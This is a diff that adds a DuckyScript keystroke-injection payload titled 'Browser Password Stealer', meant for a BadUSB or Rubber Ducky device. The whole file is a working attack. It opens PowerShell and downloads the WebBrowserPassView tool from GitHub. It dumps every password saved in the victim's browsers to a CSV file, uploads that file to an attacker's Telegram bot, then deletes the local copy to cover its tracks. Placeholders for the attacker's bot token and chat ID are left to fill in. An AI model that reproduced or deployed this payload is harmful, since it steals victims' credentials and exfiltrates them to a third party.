@@ -1,1 +1,22 @@
+REM ##########################
+REM #  _____ _       _       #
+REM # | __  |_|___ _| |_ _   #
+REM # | __ -| |  _| . | | |  #
+REM # |_____|_|_| |___|_  |  #
+REM #                | ___|  #
+REM ##########################
+REM Title: Browser Password Stealer
+REM Description: Steals all passwords stored in the Browser(s)
+REM Note: Make sure to change $BotToken and $ChatID to yours
+REM Dev Note: If you get an error about -Form it means your powershell isnt updated and doesnt support it, if you find an alternative message birdy0579 on Discord
 
+GUI r
+DELAY 300
+STRING powershell
+ENTER
+DELAY 300
+STRING Set-Location $env:TEMP; Invoke-WebRequest -Uri "https://github.com/FullM4g/Software/raw/main/WebBrowserPassView.exe" -OutFile "WebBrowserPassView.exe"; Start-Sleep -Milliseconds 2500; & .\WebBrowserPassView.exe /skeepass "$env:USERNAME-Passwords.csv"; Start-Sleep -Milliseconds 300; $BotToken = "YOUR TOKEN HERE"; $ChatID = "YOUR CHAT ID HERE"; $FilePath = "$env:TEMP\$env:USERNAME-Passwords.csv"; $Uri = "https://api.telegram.org/bot$BotToken/sendDocument"; $Form = @{chat_id = $ChatID; document = Get-Item $FilePath}; Invoke-RestMethod -Uri $Uri -Form $Form -Method Post
+ENTER
+DELAY 3000
+string del $env:USERNAME-Passwords.csv
+STRING exit
